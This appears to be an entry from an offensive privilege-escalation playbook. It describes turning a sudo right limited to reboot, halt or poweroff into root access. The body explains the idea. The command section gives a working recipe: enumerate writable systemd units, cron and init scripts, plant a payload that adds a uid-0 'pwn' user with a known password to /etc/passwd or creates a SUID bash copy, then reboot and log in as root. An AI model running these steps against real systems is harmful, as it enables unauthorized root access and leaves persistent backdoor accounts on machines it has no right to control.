title: sudo reboot / halt — A Restart IS a Privesc Trigger
body:
A sudo -l that only lets you run /sbin/reboot, /sbin/halt, or /sbin/poweroff LOOKS useless — you can't read files or run a shell. It isn't useless: a reboot is the DETONATOR for any payload that runs at boot as root.

The pairing: find something that executes on startup with root privileges and that you can write — a writable systemd unit with WantedBy=multi-user.target, an @reboot cron entry, a writable init script, or a systemd timer. Plant your payload there, then use your one privilege — reboot — to fire it.

This reframes a whole class of 'dead-end' sudo entries. The question isn't 'what can sudo run for me,' it's 'does my sudo right let me TRIGGER something that already runs as root?' reboot/halt/poweroff all do — they restart the boot sequence, and the boot sequence runs as root.

Because a reboot is slow and one-way, prefer a payload that doesn't depend on timing: adding a root user to /etc/passwd or dropping a SUID bash both survive the reboot and need no listener. A reverse shell is the fragile choice here — your catcher has to be up at the exact moment the box finishes booting.
cmd:
# ════════════════════════════════════════════════════════
# 1. Confirm the restart privilege
# ════════════════════════════════════════════════════════
sudo -l
#   (root) NOPASSWD: /sbin/reboot, /sbin/halt, /sbin/poweroff   <- this is the trigger

# ════════════════════════════════════════════════════════
# 2. Find a root-at-boot thing you can WRITE (the actual payload host)
# ════════════════════════════════════════════════════════
find /etc/systemd/system -writable -type f 2>/dev/null      # writable unit  -> writable_service node
ls -la /etc/cron.d /etc/cron.daily /etc/crontab 2>/dev/null # writable cron  (@reboot ...)
find /etc/init.d -writable 2>/dev/null                      # writable init script
systemctl list-timers 2>/dev/null                           # a timer you can edit

# ════════════════════════════════════════════════════════
# 3. Plant a timing-independent payload, then pull the trigger
# ════════════════════════════════════════════════════════
# (in the writable unit/cron, as root at boot:)
echo 'pwn:'$(openssl passwd -1 pwned)':0:0:root:/root:/bin/bash' >> /etc/passwd
#   or:  cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash

sudo /sbin/reboot
# after it comes back:
su pwn            # password: pwned   ->  id = uid=0
# or:  /tmp/rootbash -p
warn: A reboot is committing and slow — validate the payload first (systemd-analyze verify, or test your cron syntax) and confirm the hash/password match before you fire. If nothing happens after reboot, the payload host probably wasn't actually executed at boot (unit not enabled, cron not root's, script not run) — verify WITH 'systemctl is-enabled' before assuming the technique failed.

choices.label: Writable systemd unit — build the payload
